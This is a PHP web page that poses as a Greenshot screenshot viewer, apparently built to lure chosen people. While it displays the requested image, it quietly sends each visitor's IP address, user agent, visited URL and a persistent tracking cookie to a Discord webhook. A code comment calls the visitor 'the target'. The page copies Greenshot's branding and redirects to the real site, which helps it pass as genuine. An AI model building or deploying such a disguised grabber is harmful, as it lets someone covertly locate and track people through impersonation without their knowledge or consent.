<?php
require_once './api/utils/send_message.php';
require_once './api/utils/site_url.php';

if (isset($_GET['shot'])) {
	$shot = $_GET['shot'];
}

$filename = null;

foreach (['jpg', 'png', 'gif'] as $extension) {
	$test_filename = "./shots/$shot.$extension";

	if (file_exists($test_filename)) {
		$filename = $test_filename;
		break;
	}
}

if (empty($filename)) {
	header('Location: https://getgreenshot.org/');
	exit();
}

/**
 * If the target changes its IP, a cookie is used to identify it.
 */
$user_id = isset($_COOKIE['user_id']) ? $_COOKIE['user_id'] : null;

if (empty($user_id)) {
	$user_id = uniqid('user_id_', true);
	setcookie('user_id', $user_id);
}

send_message(
	'Visited Url: `http://' .
		$_SERVER['HTTP_HOST'] .
		$_SERVER['REQUEST_URI'] .
		'`' .
		"\n" .
		'IP: `' .
		$_SERVER['REMOTE_ADDR'] .
		'`' .
		"\n" .
		'User Agent: `' .
		$_SERVER['HTTP_USER_AGENT'] .
		'`' .
		"\n" .
		'User ID: `' .
		$user_id .
		'`',
	DISCORD_AMON_WEBHOOK_URL
);
?>

<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta name="robots" content="noindex, nofollow" />
    <title>Greenshot - <?= htmlspecialchars($shot) ?></title>
    <meta name="description" content="Greenshot - <?= htmlspecialchars($shot) ?>" />
    <link rel="shortcut icon" href="<?= htmlspecialchars(site_url('favicon.ico')) ?>" sizes="16x16" />
    <link
      href="https://fonts.googleapis.com/css?family=Lato|Bangers"
      rel="stylesheet"
      type="text/css"
    />
    <link
      href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"
      rel="stylesheet"
      type="text/css"
    />
    <link rel="stylesheet" type="text/css" href="<?= htmlspecialchars(site_url('assets/css/main.css')) ?>" />
  </head>
  <body>
    <main id="root">
      <img src="<?= htmlspecialchars(site_url('assets/img/greenshot-logo.png')) ?>" id="greenshot-logo" />
      <div class="image-container">
        <img class="image" src="<?= htmlspecialchars($filename) ?>" />
      </div>
    </main>
    <footer>
      <div class="content-wrapper">
        <ul>
          <li>
            <a href="https://github.com/greenshot"
              ><i class="fa fa-github fa-fw"></i> Github</a
            >
          </li>
          <li>
            <a href="https://twitter.com/greenshot_tool"
              ><i class="fa fa-twitter fa-fw"></i> Twitter</a
            >
          </li>
          <li>
            <a href="https://www.openhub.net/p/greenshot">OpenHUB</a>
          </li>
          <li>
            <a href="https://getgreenshot.org/feed"><i class="fa fa-rss fa-fw"></i> RSS-Feed</a>
          </li>
        </ul>
      </div>
    </footer>
  </body>
</html>
